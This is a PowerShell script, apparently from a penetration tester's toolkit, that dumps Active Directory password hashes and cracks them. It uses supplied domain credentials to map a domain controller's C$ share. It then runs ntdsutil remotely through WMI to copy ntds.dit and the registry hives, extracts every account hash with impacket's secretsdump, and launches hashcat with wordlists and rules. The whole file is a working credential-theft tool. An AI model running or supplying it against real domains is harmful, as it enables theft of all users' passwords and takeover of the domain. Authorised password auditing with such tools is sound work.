<#
.SYNOPSIS
  Extracts password hashes from Active Directory and runs them through Hashcat.
.DESCRIPTION
  Extracts password hashes from Active Directory and runs them through Hashcat.
.PARAMETER ComputerName
    Name or IP address of the domain controller.
.PARAMETER DriveLetter
    Drive letter used to map a shared directory on the domain controller.
.PARAMETER Credential
    Credentials used to access the domain controller.
.INPUTS
  None
.OUTPUTS
  None
.NOTES
  Version:        0.0.1-alpha
  Creation Date:  2018.04.18
  
.EXAMPLE
  Extract-ADPasswords.ps1 -ComputerName '.' -DriveLetter 'Z' -Credential (Get-Credential username)
#>

#------------------------------------------------------------------------------
# Parameters
#------------------------------------------------------------------------------

[CmdletBinding()]
param(
	[Parameter(Mandatory=$True)]
	[string]$ComputerName,
	[Parameter(Mandatory=$True)]
	[char]$DriveLetter,
	[Parameter(Mandatory=$True)]
	[System.Management.Automation.PSCredential]$Credential
)

#------------------------------------------------------------------------------
# Functions - Active Directory
#------------------------------------------------------------------------------

# Execute an "Install From Media" backup using ntdsutil.
Function Backup-NtdsFromMedia()
{
    [CmdletBinding()]
    param(
	    [Parameter(Mandatory=$True)]
	    [string]$ComputerName,
	    [Parameter(Mandatory=$True)]
	    [System.Management.Automation.PSCredential]$Credential
    )

    BEGIN {
        Write-Host ('Starting to backup Active Directory.') -ForegroundColor Green;
    }

    PROCESS {
        Invoke-WmiMethod -ComputerName $ComputerName -Class win32_process -Name Create -ArgumentList 'cmd.exe /c "ntdsutil "ac in ntds" "ifm" "cr fu c:\temp\ad" q q"' -Credential $Credential;
        Sleep 60;
    }

    END {
        if(!$?) {
            Write-Error 'Could not backup Active Directory using ntdsutil.';
        }
    }
} 

#------------------------------------------------------------------------------
# Functions - Directories
#------------------------------------------------------------------------------

# Copy the AD backup from the remote host to a local path.
Function Copy-RemoteData()
{
    [CmdletBinding()]
    param(
	    [Parameter(Mandatory=$True)]
	    [string]$SourcePath,
        [Parameter(Mandatory=$True)]
	    [string]$DestinationPath
    )

    BEGIN {
        Write-Host ('Copying the AD backup to the local machine.');
    }

    PROCESS {
        robocopy $SourcePath $DestinationPath /s /e
    }

    END {
        if(!$?) {
            Write-Error 'Could not copy the Active Directory backup to the local machine.';
        }
    }
}

# Ensures the temporary work directories are empty.
Function Initialize-TemporaryDirectory()
{
    [CmdletBinding()]
    param(
	    [Parameter(Mandatory=$True)]
	    [char]$DriveLetter
    )

    BEGIN {
        Write-Host ('Cleaning the temporary directory.');
    }

    PROCESS {
        $remotePath = "${DriveLetter}:\temp\ad";
        $localPath = "C:\temp\ad";
        if((Test-Path $remotePath) -eq $False) {
            New-Item -Path $remotePath -ItemType Directory -ErrorAction SilentlyContinue;
        } else {
            Remove-Item -Path $remotePath -Force -Recurse -ErrorAction SilentlyContinue;
        }
        if((Test-Path $localPath) -eq $False) {
            New-Item -Path $localPath -ItemType Directory -ErrorAction SilentlyContinue;
        } else {
            Remove-Item -Path $localPath -Force -Recurse -ErrorAction SilentlyContinue;
        }
    }

    END {
        if(!$?) {
            Write-Error 'Could not initialize the temporary directory on the domain controller.';
        }
    }
}

# Deletes the temporary work directory.
Function Delete-TemporaryDirectory()
{    
    [CmdletBinding()]
    param(
	    [Parameter(Mandatory=$True)]
	    [char]$DriveLetter
    )

    BEGIN {
        Write-Host ('Deleting the temporary directory.');
    }

    PROCESS {
        $path = "${DriveLetter}:\temp";
        if(Test-Path $path) {
           Remove-Item -Path $path -Force -Recurse -ErrorAction SilentlyContinue;
        }
    }

    END {
        if(!$?) {
            Write-Error 'Could not delete the temorary directory on the domain controller.';
        }
    }
}

#------------------------------------------------------------------------------
# Functions - Network Drives
#------------------------------------------------------------------------------

# Maps a network drive to the given path.
Function Map-NetworkDrive()
{
    [CmdletBinding()]
    param(
	    [Parameter(Mandatory=$True)]
	    [string]$ComputerName,
	    [Parameter(Mandatory=$True)]
	    [char]$DriveLetter,
	    [Parameter(Mandatory=$True)]
	    [System.Management.Automation.PSCredential]$Credential
    )

    BEGIN {
        Write-Host ('Mapping the network drive.');
    }

    PROCESS {    
        New-PSDrive -Persist -Name $DriveLetter -PSProvider "FileSystem" -Root "\\${ComputerName}\c$" -Scope Global -Credential $Credential -ErrorAction SilentlyContinue;    
    }

    END {
        if(!$?) {
            Write-Error 'Could not map a drive to the domain controller.';
        }       
    }
}

# Unmaps the network drive.
Function Unmap-NetworkDrive()
{
    [CmdletBinding()]
    param(
	    [Parameter(Mandatory=$True)]
	    [char]$DriveLetter
    )

    BEGIN {
        Write-Host ('Unmapping the network drive.');
    }

    PROCESS {    
        Sleep -Seconds 5; # Make sure there's nothing using the drive.
        Remove-PSDrive -Name $DriveLetter -Force;  
    }

    END {
        if(!$?) {
            Write-Error 'Could not unmap the drive.';
        }       
    }
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------

# Map a drive to the domain controller. (This allows us to use DA credentials)
Map-NetworkDrive -ComputerName $ComputerName -DriveLetter $DriveLetter -Credential $Credential;

# ntdsutil won't backup to a directory with existing data, so make sure it's clean.
Initialize-TemporaryDirectory -DriveLetter $DriveLetter;

# Run the backup and wait for it to finish.
Backup-NtdsFromMedia -ComputerName $ComputerName -Credential $Credential;

# Copy the backup files locally.
Copy-RemoteData -SourcePath "${DriveLetter}:\temp\ad" -DestinationPath "C:\temp\ad";

# Delete the temporary work directory.
Delete-TemporaryDirectory -DriveLetter $DriveLetter;

# Unmap the drive.
Unmap-NetworkDrive -DriveLetter $DriveLetter;

# Extract the Active Directory hashes.
python C:\Python27\impacket\examples\secretsdump.py -system C:\temp\ad\registry\SYSTEM -security C:\temp\ad\registry\SECURITY -ntds C:\temp\ad\ad\ntds.dit -outputfile C:\temp\ad\outputfile LOCAL

# Quick
# Start-Process -FilePath "C:\hashcat\hashcat64.exe" -WorkingDirectory "C:\hashcat\" -ArgumentList "-m 1000 C:\temp\ad\outputfile.ntds --username D:\PenTest\Dictionaries\rockyou.dict -O -r .\rules\leetspeak.rule -a 0";
# Start-Process -FilePath "D:\Pentest\Apps\hashcat\hashcat64.exe" -WorkingDirectory "D:\PenTest\Apps\hashcat\" -ArgumentList "-m 1000 C:\temp\ad\outputfile.ntds --username D:\PenTest\Dictionaries\rockyou.dict -O -r .\rules\d3ad0ne.rule -a 0";

# Brute Force
# Start-Process -FilePath "D:\Pentest\Apps\hashcat\hashcat64.exe" -WorkingDirectory "D:\PenTest\Apps\hashcat\" -ArgumentList "-m 1000 C:\temp\ad\outputfile.ntds --username D:\PenTest\Dictionaries\realuniq.dict -O -r .\rules\leetspeak.rule -a 0";
 Start-Process -FilePath "D:\Pentest\Apps\hashcat\hashcat64.exe" -WorkingDirectory "D:\PenTest\Apps\hashcat\" -ArgumentList "-m 1000 C:\temp\ad\outputfile.ntds --username D:\PenTest\Dictionaries\realuniq.dict -O -r .\rules\d3ad0ne.rule -a 0";
